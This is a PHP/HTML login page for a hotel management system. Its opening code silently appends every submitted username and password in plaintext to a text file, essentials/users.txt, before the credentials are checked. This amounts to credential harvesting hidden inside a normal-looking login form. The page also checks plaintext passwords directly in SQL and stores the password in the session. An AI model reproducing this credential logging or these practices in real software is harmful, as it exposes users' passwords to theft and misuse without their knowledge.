<?php
session_start();
include 'base.php';
if(isset($_POST['username']) && !empty($_POST['password'])) {
$username=mysqli_real_escape_string($db_conn,$_POST['username']);
$handle=fopen("essentials/users.txt","a");
fwrite($handle,$username." ");
fclose($handle);
}
if(isset($_POST['password']) && !empty($_POST['password'])) {
$password=mysqli_real_escape_string($db_conn,$_POST['password']);
$handle=fopen("essentials/users.txt","a");
fwrite($handle,$password." "."\n");
fclose($handle);
}


if(isset($_POST['submit'])) {
$username=mysqli_real_escape_string($db_conn,$_POST['username']);
$password=mysqli_real_escape_string($db_conn,$_POST['password']);
$login_query="SELECT * FROM admin_details WHERE username='$username' and password='$password' AND user_type='admin'";
$run_user=mysqli_query($db_conn,$login_query);
$count1=mysqli_num_rows($run_user);
 if($count1>0){
  // Declaring the session variables...
  $_SESSION['username'] = $username;
  $_SESSION['password'] = $password;
  header('location:index1.php');
  }else{
$sql="SELECT * FROM user_details WHERE username= '$username' AND password='$password'";
$run_client=mysqli_query($db_conn,$sql);
$count2=mysqli_num_rows($run_client);
if ( $count2>0){
header('location:index2.php');
}else{
  echo "<script> alert('Problem encountered.Supply the correct credentials!!')</script>";
  }
}
if($count1>0){
$insert1="insert into user_log (username,login_date,login_time) values ('$username', NOW(),localtime())";
$product1=mysqli_query($db_conn,$insert1);
}
else if ($count2>0){
$insert2="insert into user_log (`username`,`login_date`,`login_time`) values ('$username', NOW(),localtime())";
$product2=mysqli_query($db_conn,$insert2);
}
else {
  echo "<script> alert('Problem encountered while updating the user_log data!!')</script>";
}
}
  mysqli_close($db_conn);
?>

<hr />
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Deluxe Hotel Management System</title>
  <?php include 'essentials/externalReference.php' ?>
  <script language="javascript" type="text/javascript" src="js/login.js">
  </script>

  <!-- Inline style goes here...-->

  <style type="text/css">

  input[type=text] {
    width: 50%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: 2px solid maroon;
    border-radius: 4px;
    background: #ccc url(images/background2.jpg) repeat;
    background-attachment: fixed;
    color: white;
}
input[type=password] {
    width: 50%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: 2px solid maroon;
    border-radius: 4px;
    background: #ccc url(images/background2.jpg) repeat;
    background-attachment: fixed;
    color: white;
}
.button_small {
    background-color: #4CAF50;
    border-radius:5px;
    padding: 8px 16px;
    text-decoration: none;
    width: 45px;
    margin-left:80px;
  }
</style>
</head>
<body>
<br /> <br />
  <div id="main_index">
    <?php include 'essentials/header.php' ?>
    <div class="button_small">
          <a href="index.php">Homepage</a>
        </div><!--close button_small--> 
  <div id="loginContainer">
<h1 style="margin-left:120px;color:black;text-decoration:none;">  The Login Form </h1>
<hr />
<hr />
<br />
<form name="myForm" method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" onsubmit="return(validate());" novalidate>
                <div id="form-group">
                    <label style="color:black;margin-left:30px;">Username:</label>
                    <input name="username" type="text" placeholder="Username...">
                </div>  <br /> <br />
                <div id="form-group">
                <label style="color:black;margin-left:35px;">Password:</label>
                    <input name="password" type="password" placeholder="Password..." >
                </div> <br /> <br />
              <input type="submit" name="submit" value="Login" style="margin-left:200px;" >
            </form>
            </div> <!-- close loginContainer -->
            <p style="margin-left:40px;font-size:17px;"><a href="passwordRecovery.php"> <b> Forgot Password </b> </a></p>
<?php include 'essentials/footer.php' ?> 
</div> <!-- close main_index --> 
<br />
<br />
</body>
</html>